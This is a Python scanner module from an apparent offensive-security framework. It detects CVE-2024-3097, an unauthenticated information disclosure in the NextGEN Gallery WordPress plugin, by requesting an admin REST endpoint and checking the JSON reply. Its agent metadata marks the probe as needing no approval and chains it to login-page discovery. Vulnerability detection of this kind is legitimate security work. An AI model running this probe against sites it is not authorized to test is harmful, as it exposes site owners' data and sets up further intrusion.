#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The WordPress Gallery Plugin – NextGEN Gallery plugin for WordPress is vulnerable to unauthorized access of da."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'NextGEN Gallery <= 3.59 - Missing Authorization to Unauthenticated Information Disclosure Detection',
        'description': 'The WordPress Gallery Plugin – NextGEN Gallery plugin for WordPress is vulnerable to unauthorized access of data due to a missing capability check on the get_item function in versions up to, and including, 3.59. This makes it possible for unauthenticated attackers to extract sensitive data including EXIF and other metadata of any image uploaded through the plugin.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'wordpress', 'nextgen-gallery', 'wp-plugin', 'info-leak', 'imagely', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://plugins.trac.wordpress.org/browser/nextgen-gallery/trunk/src/REST/Admin/Block.php#L40',
            'https://www.wordfence.com/threat-intel/vulnerabilities/id/75f87f99-9f0d-46c2-a6f1-3c1ea0176303?source=cve',
            'https://zpbrent.github.io/pocs/8-plugin-nextgen-gallery-InfoDis-20240327.mp4',
            'https://github.com/fkie-cad/nvd-json-data-feeds',
        ],
        'cve': 'CVE-2024-3097',
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-json/ngg/v1/admin/block/image/1', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('"success":', '"image":',)
        header_any = ('application/json',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="NextGEN Gallery <= 3.59 - Missing Authorization to Unauthenticated Information Disclosure detected",
                path='/wp-json/ngg/v1/admin/block/image/1',
            )
            return True
        return False

